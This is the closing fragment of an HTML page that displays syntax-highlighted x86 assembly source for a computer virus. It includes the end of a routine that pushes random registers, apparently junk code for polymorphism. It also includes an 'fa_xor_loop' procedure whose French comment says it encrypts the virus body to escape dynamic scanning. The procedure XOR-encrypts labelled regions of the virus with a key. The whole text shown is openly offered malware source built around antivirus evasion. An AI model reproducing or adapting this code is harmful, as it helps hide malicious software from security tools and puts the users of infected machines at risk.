        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rp_1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">rp_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rand_pushs</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; FA_XOR_LOOP</span><span class="sc0">
</span><span class="sc1">; in : none</span><span class="sc0">
</span><span class="sc1">;encrypte le corps du virus pour échapper au scan dynamique</span><span class="sc0">
</span><span class="sc5">fa_xor_loop</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">anti_call_1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">debut_virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">faxl_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cle_anti_call</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">faxl_1</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fin_dyn_fake_apis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">anti_call_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">faxl_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cle_anti_call</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">faxl_2</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fa_xor_loop</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">XOR_LOOP_SIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fa_xor_loop</span><span class="sc0">



</span></div></body>
</html>
